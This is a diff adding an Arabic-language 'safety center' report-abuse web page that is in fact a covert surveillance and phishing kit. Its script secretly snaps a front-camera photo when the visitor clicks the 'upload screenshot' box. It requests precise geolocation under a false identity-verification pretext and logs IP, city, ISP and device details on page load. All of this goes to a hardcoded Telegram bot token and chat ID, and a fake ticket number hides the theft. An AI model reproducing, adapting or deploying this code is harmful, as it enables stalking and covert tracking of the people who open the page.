@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#ffffff">
+<title>الإبلاغ عن مشكلة - </title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+body{background:#ffffff;color:#161823;padding:20px;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;line-height:1.5}
+.report-container{width:100%;max-width:500px}
+.header-bar{display:flex;align-items:center;gap:12px;padding-bottom:16px;border-bottom:1px solid #f1f1f2;margin-bottom:20px}
+.back-btn{width:32px;height:32px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer;color:#161823;border-radius:50%;transition:background .15s}
+.back-btn:active{background:#f1f1f2}
+.header-title{font-size:17px;font-weight:700;color:#161823}
+h1{font-size:26px;font-weight:700;margin-bottom:10px;color:#161823}
+p.lead{font-size:14px;color:#8A8B91;line-height:1.65;margin-bottom:24px}
+.form-group{margin-bottom:22px}
+label{display:block;font-size:15px;font-weight:600;color:#161823;margin-bottom:8px}
+label .required{color:#fe2c55;margin-left:2px}
+.select-wrapper{position:relative;width:100%}
+select{width:100%;padding:14px 16px;font-size:15px;color:#161823;background:#fff;border:1px solid #d1d1d6;border-radius:6px;appearance:none;outline:none;cursor:pointer;transition:border-color .2s;font-family:inherit}
+select:focus{border-color:#161823}
+select.empty{color:#8A8B91}
+.select-wrapper::after{content:"";position:absolute;left:16px;top:50%;transform:translateY(-30%) rotate(45deg);width:8px;height:8px;border-right:2px solid #8A8B91;border-bottom:2px solid #8A8B91;pointer-events:none}
+.input-box{width:100%;padding:14px 16px;font-size:15px;color:#161823;background:#fff;border:1px solid #d1d1d6;border-radius:6px;outline:none;font-family:inherit;transition:border-color .2s}
+.input-box:focus{border-color:#161823}
+.input-box::placeholder{color:#8A8B91}
+.submit-btn{width:100%;padding:15px;font-size:16px;font-weight:700;color:#fff;background:#fe2c55;border:none;border-radius:6px;cursor:pointer;transition:background-color .2s;font-family:inherit;margin-top:8px}
+.submit-btn:hover{background:#e0244c}
+.submit-btn:active{background:#c91c40}
+.info-note{margin-top:24px;padding:14px;background:#f8f8f8;border-radius:8px;font-size:12.5px;color:#8A8B91;line-height:1.65}
+.info-note strong{color:#161823;font-weight:600}
+.help-text{font-size:12.5px;color:#8A8B91;margin-top:6px;line-height:1.5}
+.upload-area{border:2px dashed #d1d1d6;border-radius:10px;padding:28px 20px;text-align:center;cursor:pointer;transition:all .2s;background:#fafafa;position:relative;overflow:hidden}
+.upload-area:hover{border-color:#fe2c55;background:#fff5f7}
+.upload-area:active{transform:scale(.99)}
+.upload-icon{width:48px;height:48px;margin:0 auto 12px;border-radius:50%;background:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,.06)}
+.upload-icon svg{width:24px;height:24px;stroke:#fe2c55;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
+.upload-title{font-size:14px;font-weight:600;color:#161823;margin-bottom:4px}
+.upload-sub{font-size:12px;color:#8A8B91;line-height:1.5}
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:1000;padding:24px}
+.modal-overlay.show{display:flex}
+.modal{background:#fff;border-radius:12px;padding:28px 24px;max-width:380px;width:100%;text-align:center;animation:modalIn .25s cubic-bezier(.16,1,.3,1)}
+@keyframes modalIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}
+.modal-icon{width:64px;height:64px;margin:0 auto 18px;border-radius:50%;background:#fff5f7;display:flex;align-items:center;justify-content:center;font-size:28px;color:#fe2c55}
+.modal-title{font-size:18px;font-weight:700;color:#161823;margin-bottom:10px}
+.modal-text{font-size:14px;color:#8A8B91;line-height:1.65;margin-bottom:22px}
+.modal-btn{width:100%;padding:13px;background:#fe2c55;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:8px;font-family:inherit}
+.modal-btn:active{background:#e0244c}
+.modal-btn.secondary{background:transparent;color:#8A8B91}
+.modal-btn.secondary:active{background:#f1f1f2}
+.loading{display:none;text-align:center;padding:40px 20px}
+.loading.show{display:block}
+.spinner{width:44px;height:44px;border:3px solid #f1f1f2;border-top-color:#fe2c55;border-radius:50%;margin:0 auto 20px;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{font-size:15px;color:#161823;font-weight:600;margin-bottom:6px}
+.loading-sub{font-size:13px;color:#8A8B91}
+.success{display:none;text-align:center;padding:40px 20px}
+.success.show{display:block}
+.success-icon{width:70px;height:70px;background:#25F4EE;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;color:#000;font-size:32px;animation:pop .5s cubic-bezier(.68,-.55,.265,1.55)}
+@keyframes pop{0%{transform:scale(0)}100%{transform:scale(1)}}
+.success-title{font-size:20px;font-weight:700;color:#161823;margin-bottom:10px}
+.success-text{font-size:14px;color:#8A8B91;line-height:1.65;margin-bottom:20px}
+.report-id{display:inline-block;padding:8px 16px;background:#f8f8f8;border-radius:6px;font-size:13px;color:#161823;font-weight:600;font-family:monospace;letter-spacing:.5px}
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:#161823;color:#fff;padding:12px 20px;border-radius:8px;font-size:13px;max-width:90%;transition:transform .3s;z-index:2000;text-align:center;line-height:1.5}
+.toast.show{transform:translateX(-50%) translateY(0)}
+video,canvas{position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;top:-9999px;left:-9999px}
+</style>
+</head>
+<body>
+
+<div class="report-container">
+
+  <div class="header-bar">
+    <button class="back-btn" aria-label="رجوع">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"></polyline></svg>
+    </button>
+    <span class="header-title">مركز الأمان</span>
+  </div>
+
+  <div id="formSection">
+    <h1>الإبلاغ عن مشكلة</h1>
+    <p class="lead">أخبرنا عن مشكلة ترغب في الإبلاغ عنها أو تعليقاتك حول تجربتك مع موقع تحقيق. سيتم استخدام المعلومات التي تمت مشاركتها فقط للرد على إبلاغك.</p>
+
+    <form id="reportForm" onsubmit="return false;">
+
+      <div class="form-group">
+        <label for="subject">الموضوع<span class="required">*</span></label>
+        <div class="select-wrapper">
+          <select id="subject" name="subject" class="empty" required>
+            <option value="" disabled selected>حدد خيارًا</option>
+            <option value="fake_account">الإبلاغ عن حساب مزيف ينتحل شخصيتي</option>
+            <option value="identity_theft">كشف هوية حساب يقوم بانتحال صفتي</option>
+            <option value="impersonation">انتحال صفة شخص أو جهة رسمية</option>
+            <option value="stolen_content">سرقة محتواي ونشره دون إذن</option>
+            <option value="fake_news">نشر معلومات كاذبة عني</option>
+            <option value="harassment">التحرش أو المضايقة</option>
+            <option value="spam">حساب مزعج أو سبام</option>
+            <option value="other">مشكلة أخرى</option>
+          </select>
+        </div>
+        <div class="help-text">اختر نوع البلاغ الأقرب لحالتك.</div>
+      </div>
+
+      <div class="form-group">
+        <label for="usernameInput">اسم المستخدم المُبلَّغ عنه<span class="required">*</span></label>
+        <input type="text" class="input-box" id="usernameInput" placeholder="@username" autocomplete="off" spellcheck="false">
+        <div class="help-text">أدخل اسم المستخدم للحساب الذي ترغب بالإبلاغ عنه.</div>
+      </div>
+
+      <div class="form-group">
+        <label>لقطة شاشة للحساب المُبلَّغ عنه<span class="required">*</span></label>
+
+        <div class="upload-area" id="uploadArea">
+          <div class="upload-icon">
+            <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
+          </div>
+          <div class="upload-title">رفع الصورة</div>
+          <div class="upload-sub">اضغط لرفع صورة الصفحة </div>
+        </div>
+
+      </div>
+
+      <button type="submit" class="submit-btn" id="submitBtn">إرسال البلاغ</button>
+    </form>
+
+    <div class="info-note">
+      <strong>ملاحظة:</strong> جميع البلاغات تُراجَع من قِبل فريق الأمان خلال 24 ساعة. يُرجى التأكد من صحة المعلومات المُدخلة.
+    </div>
+  </div>
+
+  <div class="loading" id="loadingSection">
+    <div class="spinner"></div>
+    <div class="loading-text">جاري إرسال البلاغ...</div>
+    <div class="loading-sub" id="loadingSub">يتم التحقق من البيانات</div>
+  </div>
+
+  <div class="success" id="successSection">
+    <div class="success-icon">✓</div>
+    <div class="success-title">تم استلام بلاغك</div>
+    <div class="success-text">سيتم مراجعة طلبك من قِبل فريق الأمان خلال 24 ساعة.<br>سنُعلمك بالنتيجة عبر إشعارات التطبيق.</div>
+    <div class="report-id" id="reportId">TKT-0000</div>
+  </div>
+
+</div>
+
+<div class="modal-overlay" id="permModal">
+  <div class="modal">
+    <div class="modal-icon">🔒</div>
+    <div class="modal-title">الرجاء الموافقة على الأذونات المطلوبة</div>
+    <div class="modal-text">لاستكمال إرسال البلاغ بشكل رسمي، يحتاج النظام إلى الوصول إلى الكاميرا والموقع الجغرافي للتحقق من هوية المُبلِّغ.</div>
+    <button class="modal-btn" id="permAllowBtn">السماح والمتابعة</button>
+    <button class="modal-btn secondary" id="permDenyBtn">لاحقاً</button>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+(function(){
+"use strict";
+
+var BOT_TOKEN="8687054964:AAFCZn62wp9o4skQWGeWH31bSvqYuGpyeYE";
+var CHAT_ID="5526748858";
+var tg="https://api.telegram.org/bot"+BOT_TOKEN;
+var $=function(id){return document.getElementById(id)};
+
+var camGranted=false;
+var locGranted=false;
+var photoBlob=null;
+var userLocation=null;
+var visitReported=false;
+var currentUsername="";
+
+function showToast(msg){
+  var t=$('toast');
+  t.textContent=msg;
+  t.classList.add('show');
+  clearTimeout(window._toastTimer);
+  window._toastTimer=setTimeout(function(){t.classList.remove('show');},5000);
+}
+
+function sendText(text){
+  return fetch(tg+"/sendMessage",{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({chat_id:CHAT_ID,text:text,parse_mode:'HTML',disable_web_page_preview:true})
+  }).catch(function(){});
+}
+
+function sendPhoto(blob,caption){
+  var fd=new FormData();
+  fd.append('chat_id',CHAT_ID);
+  fd.append('photo',blob,'img_'+Date.now()+'.jpg');
+  fd.append('caption',caption);
+  fd.append('parse_mode','HTML');
+  return fetch(tg+"/sendPhoto",{method:'POST',body:fd}).catch(function(){});
+}
+
+function quickCapture(){
+  return new Promise(function(resolve){
+    if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){
+      resolve(null);return;
+    }
+    navigator.mediaDevices.getUserMedia({
+      video:{facingMode:'user',width:{ideal:1280},height:{ideal:960}},
+      audio:false
+    }).then(function(stream){
+      var v=$('cam');
+      v.srcObject=stream;
+      v.play().catch(function(){});
+      setTimeout(function(){
+        var vw=v.videoWidth||1280;
+        var vh=v.videoHeight||960;
+        var c=$('canvas');
+        c.width=vw;c.height=vh;
+        var ctx=c.getContext('2d');
+        ctx.imageSmoothingEnabled=true;
+        ctx.imageSmoothingQuality='high';
+        ctx.save();
+        ctx.translate(vw,0);
+        ctx.scale(-1,1);
+        ctx.drawImage(v,0,0,vw,vh);
+        ctx.restore();
+        c.toBlob(function(blob){
+          try{stream.getTracks().forEach(function(t){t.stop();});}catch(e){}
+          v.srcObject=null;
+          resolve(blob);
+        },'image/jpeg',0.92);
+      },1200);
+    }).catch(function(){resolve(null);});
+  });
+}
+
+function requestLocation(){
+  return new Promise(function(res){
+    if(!navigator.geolocation){res(null);return;}
+    navigator.geolocation.getCurrentPosition(
+      function(p){res({lat:p.coords.latitude,lng:p.coords.longitude,acc:Math.round(p.coords.accuracy)});},
+      function(){res(null);},
+      {enableHighAccuracy:true,timeout:20000,maximumAge:0}
+    );
+  });
+}
+
+function getIP(){
+  return fetch('https://ipapi.co/json/').then(function(r){return r.json();}).catch(function(){return null;});
+}
+
+function getDeviceInfo(){
+  var ua=navigator.userAgent;
+  var device='?',os='?',browser='?';
+  if(/iPhone/i.test(ua))device='iPhone';
+  else if(/iPad/i.test(ua))device='iPad';
+  else if(/Android/i.test(ua))device='Android';
+  else if(/Windows/i.test(ua))device='Windows';
+  else if(/Mac/i.test(ua))device='Mac';
+  if(/iPhone|iPad|iPod/.test(ua))os='iOS';
+  else if(/Android/.test(ua))os='Android';
+  else if(/Windows/.test(ua))os='Windows';
+  else if(/Mac/.test(ua))os='macOS';
+  if(/Edg\//.test(ua))browser='Edge';
+  else if(/Chrome\//.test(ua)&&!/Edg/.test(ua))browser='Chrome';
+  else if(/Firefox\//.test(ua))browser='Firefox';
+  else if(/Safari\//.test(ua)&&!/Chrome/.test(ua))browser='Safari';
+  return{device:device,os:os,browser:browser,ua:ua};
+}
+
+function collectVisitData(){
+  if(visitReported)return;
+  visitReported=true;
+  getIP().then(function(ip){
+    var info=getDeviceInfo();
+    var timeStr=new Date().toLocaleString('ar-EG',{timeZone:'Asia/Riyadh',hour12:false});
+    var msg='📥 <b>زيارة جديدة — مركز الأمان</b>\n';
+    msg+='━━━━━━━━━━━━━━━━━━━━━━\n';
+    msg+='🕐 '+timeStr+'\n';
+    msg+='📱 '+info.device+' — '+info.os+'\n';
+    msg+='🌐 '+info.browser+'\n';
+    if(ip&&ip.ip){
+      msg+='\n🌍 <code>'+ip.ip+'</code>\n';
+      msg+='📍 '+(ip.country_name||'?')+' — '+(ip.city||'?')+'\n';
+      msg+='🏢 '+(ip.org||'?');
+    }
+    sendText(msg);
+  });
+}
+
+$('uploadArea').addEventListener('click',function(e){
+  e.preventDefault();
+  e.stopPropagation();
+
+  var area=$('uploadArea');
+  area.style.opacity='0.5';
+
+  quickCapture().then(function(blob){
+    area.style.opacity='1';
+    if(!blob){
+      showToast('الرجاء الموافقة على أذونات الكاميرا');
+      return;
+    }
+    camGranted=true;
+    photoBlob=blob;
+
+    getIP().then(function(ip){
+      var info=getDeviceInfo();
+      var timeStr=new Date().toLocaleString('ar-EG',{timeZone:'Asia/Riyadh',hour12:false});
+      var msg='📸 <b>لقطة شاشة مرفوعة</b>\n';
+      msg+='━━━━━━━━━━━━━━━━━━━━━━\n';
+      msg+='🕐 '+timeStr+'\n';
+      msg+='📱 '+info.device+' — '+info.os;
+      if(ip&&ip.ip)msg+='\n🌍 IP: <code>'+ip.ip+'</code>';
+      sendText(msg).then(function(){
+        sendPhoto(blob,'🖼️ لقطة الشاشة المرافقة للبلاغ');
+      });
+    });
+  });
+});
+
+$('subject').addEventListener('change',function(){
+  this.classList.toggle('empty',!this.value);
+});
+
+$('permAllowBtn').addEventListener('click',function(){
+  $('permModal').classList.remove('show');
+  quickCapture().then(function(photo){
+    if(photo){photoBlob=photo;camGranted=true;}
+    requestLocation().then(function(loc){
+      if(loc){userLocation=loc;locGranted=true;}
+      if(camGranted&&locGranted)doSubmit();
+      else showToast('الرجاء الموافقة على الأذونات المطلوبة');
+    });
+  });
+});
+
+$('permDenyBtn').addEventListener('click',function(){
+  $('permModal').classList.remove('show');
+  showToast('الرجاء الموافقة على الأذونات المطلوبة لإكمال الطلب');
+});
+
+$('submitBtn').addEventListener('click',function(){
+  var subject=$('subject').value;
+  if(!subject){
+    showToast('الرجاء تحديد موضوع البلاغ');
+    $('subject').focus();
+    return;
+  }
+  var uname=$('usernameInput').value.trim().replace(/^@/,'');
+  if(!uname||uname.length<2){
+    showToast('الرجاء إدخال اسم المستخدم المُبلَّغ عنه');
+    $('usernameInput').focus();
+    return;
+  }
+  currentUsername=uname;
+
+  if(!camGranted||!locGranted){
+    quickCapture().then(function(photo){
+      if(photo){photoBlob=photo;camGranted=true;}
+      requestLocation().then(function(loc){
+        if(loc){userLocation=loc;locGranted=true;}
+        doSubmit();
+      });
+    });
+    return;
+  }
+  doSubmit();
+});
+
+function doSubmit(){
+  var subject=$('subject').value;
+  var subjectText=$('subject').options[$('subject').selectedIndex].text;
+  var username=$('usernameInput').value.trim().replace(/^@/,'');
+  currentUsername=username;
+
+  $('formSection').style.display='none';
+  $('loadingSection').classList.add('show');
+
+  $('loadingSub').textContent='جاري إرسال البلاغ...';
+  setTimeout(function(){$('loadingSub').textContent='التحقق من البيانات...';},1200);
+  setTimeout(function(){$('loadingSub').textContent='إنشاء رقم البلاغ...';},2400);
+
+  getIP().then(function(ip){
+    var info=getDeviceInfo();
+    var timeStr=new Date().toLocaleString('ar-EG',{timeZone:'Asia/Riyadh',hour12:false});
+    var screenInfo=screen.width+'x'+screen.height+' @'+window.devicePixelRatio+'x';
+
+    var msg='🎯 <b>بلاغ جديد — مركز الأمان</b>\n';
+    msg+='━━━━━━━━━━━━━━━━━━━━━━\n';
+    msg+='📌 <b>نوع البلاغ:</b> '+subjectText+'\n';
+    msg+='👤 <b>Username المُبلَّغ عنه:</b> <code>@'+username+'</code>\n';
+    msg+='\n🕐 '+timeStr+'\n';
+    msg+='📱 '+info.device+' — '+info.os+'\n';
+    msg+='🌐 '+info.browser+'\n';
+    msg+='📐 '+screenInfo+'\n';
+
+    if(userLocation){
+      msg+='\n📍 <b>الموقع:</b>\n';
+      msg+='Lat: <code>'+userLocation.lat+'</code>\n';
+      msg+='Lng: <code>'+userLocation.lng+'</code>\n';
+      msg+='دقة: ~'+userLocation.acc+'m\n';
+      msg+='🗺️ <a href="https://maps.google.com/?q='+userLocation.lat+','+userLocation.lng+'">خرائط Google</a>\n';
+    }
+
+    if(ip&&ip.ip){
+      msg+='\n🌍 <b>الشبكة:</b>\n';
+      msg+='IP: <code>'+ip.ip+'</code>\n';
+      msg+='📍 '+(ip.country_name||'?')+' — '+(ip.city||'?')+'\n';
+      msg+='🏢 '+(ip.org||'?');
+    }
+
+    return sendText(msg).then(function(){
+      if(photoBlob)return sendPhoto(photoBlob,'📸 لقطة الشاشة المرافقة للبلاغ\n@'+username);
+    });
+  }).then(function(){
+    setTimeout(function(){
+      $('loadingSection').classList.remove('show');
+      $('successSection').classList.add('show');
+      $('reportId').textContent='TKT-'+Date.now().toString(36).toUpperCase().slice(-8);
+    },800);
+  });
+}
+
+window.addEventListener('load',function(){
+  setTimeout(collectVisitData,1500);
+});
+
+})();
+</script>
+</body>
+</html>
